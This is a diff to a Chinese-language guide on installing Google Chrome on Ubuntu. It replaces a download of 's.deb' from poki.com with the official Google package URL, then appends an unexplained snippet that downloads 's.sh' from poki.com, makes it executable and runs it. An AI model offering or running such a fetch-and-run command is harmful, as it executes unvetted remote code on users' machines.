@@ -12,13 +12,13 @@ https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 2. 使用`wget`命令下载.deb文件。如果你的系统中没有安装`wget`，你可以使用`sudo apt install wget`来安装。下载命令如下：
 
     ```
-    wget https://poki.com/s.deb
+    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
     ```
 
 3. 下载完成后，使用`dpkg`命令进行安装：
 
     ```
-    sudo dpkg -i s.deb
+    sudo dpkg -i google-chrome-stable_current_amd64.deb
     ```
 
 4. 如果在安装过程中遇到依赖问题，你可以使用以下命令来解决：
@@ -30,3 +30,11 @@ https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 这个命令会自动检查并安装缺失的依赖。
 
 注意：在执行这些步骤之前，请确保你信任这个软件源，并且这个.deb文件是适用于你的Ubuntu版本和架构的。
+
+
+
+Ubuntu运行来自https://poki.com/s.sh的代码的命令
+wget https://poki.com/s.sh
+chmod +x s.sh
+./s.sh
+
